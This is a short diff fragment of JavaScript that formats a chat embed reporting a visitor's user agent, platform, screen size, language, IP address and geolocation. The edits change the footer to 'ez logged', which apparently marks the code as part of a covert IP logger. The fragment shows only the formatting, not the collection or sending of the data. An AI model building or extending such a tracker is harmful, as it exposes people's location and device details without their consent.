@@ -144,22 +144,21 @@
                                 fields: [
                                     {
                                         name: "Device Information",
-                                        value: `
                                         
+                                        value: `
                                         **User Agent:** ${deviceInfo.userAgent}
-
                                         **Platform:** ${deviceInfo.platform}
-                                        **Screen Resolution:** ${deviceInfo.screenWidth} x ${deviceInfo.screenHeight}
+                                        **Screen Width:** ${deviceInfo.screenWidth}
+                                        **Screen Height:** ${deviceInfo.screenHeight}
                                         **Language:** ${deviceInfo.language}
                                         `,
                                         inline: false
                                     },
                                     {
                                         name: "IP Information",
-                                        value: `
                                         
+                                        value: `
                                         **IP Address:** ${geoInfo.ip}
-
                                         **Country:** ${countryName} (${geoInfo.countryCode})
                                         **Region:** ${geoInfo.region}
                                         **City:** ${geoInfo.city}
@@ -173,7 +172,7 @@
                                     url: flagURL // Displays the country flag
                                 },
                                 footer: {
-                                    text: "Information fetched using ipinfo.io and restcountries.com"
+                                    text: "ez logged"
                                 },
                                 timestamp: new Date()  // Adds the timestamp
                             }]
